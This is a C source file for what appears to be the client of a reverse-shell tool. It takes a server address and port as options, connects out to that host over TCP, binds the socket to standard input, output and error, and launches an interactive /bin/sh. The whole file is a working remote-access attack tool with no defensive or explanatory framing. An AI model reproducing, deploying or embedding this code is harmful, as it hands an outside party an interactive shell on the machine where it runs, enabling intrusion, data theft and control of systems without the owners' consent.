#include <arpa/inet.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "rsh.h"

static void usage(const char *progname) {
  const char *banner = BANNER;

  RSH_LOG(
      "%s\nusage: %s [OPTIONS]\n\n"
      "OPTIONS\n"
      " -p <port> Specify the port of the server\n"
      " -s <addr> Specify the server address\n"
      " -h        Show this message\n", banner, progname);
}

static int parse_args(int argc, char *argv[], struct rsh_ctx_t *ctx) {
  const char *short_opts = "p:s:h";
  int opt;

  while ((opt = getopt(argc, argv, short_opts)) != -1) {
    switch (opt) {
    case 'p':
      ctx->port = htons(atoi(optarg));
      break;
    case 's':
      memcpy(ctx->ip, optarg, sizeof(ctx->ip) - 1);
      break;
    case 'h':
      return 1;
    }
  }

  if (!ctx->port || (ctx->ip[0] == '\0')) {
    return 1;
  }

  return 0;
}

static void exec_shell(int fd) {
  char *const cmd[3] = { "/bin/sh", "-i", NULL };

  dup2(fd, STDIN_FILENO);
  dup2(fd, STDOUT_FILENO);
  dup2(fd, STDERR_FILENO);

  execv(cmd[0], cmd);
}

static int run(struct rsh_ctx_t *ctx) {
  struct sockaddr_in addr;
  int fd;

  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    RSH_ERROR("fail to create the communication socket!\n");
    return 1;
  }

  memset(&addr, 0, sizeof(struct sockaddr_in));

  addr.sin_family = AF_INET;
  addr.sin_port = ctx->port;
  inet_aton(ctx->ip, &addr.sin_addr);

  RSH_INFO("trying to connect to server...\n");

  if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {
    RSH_ERROR("fail to connect to server!\n");
    close(fd);

    return 1;
  }

  RSH_INFO("connection established!\n");

  exec_shell(fd);

  return 0;  // normally never reached
}

int main(int argc, char *argv[]) {
  struct rsh_ctx_t ctx;

  memset(&ctx, 0, sizeof(struct rsh_ctx_t));

  // parse the server ip and port
  if (parse_args(argc, argv, &ctx)) {
    usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  // run the client
  int ret = run(&ctx);

  exit(!ret ? EXIT_SUCCESS : EXIT_FAILURE);
}
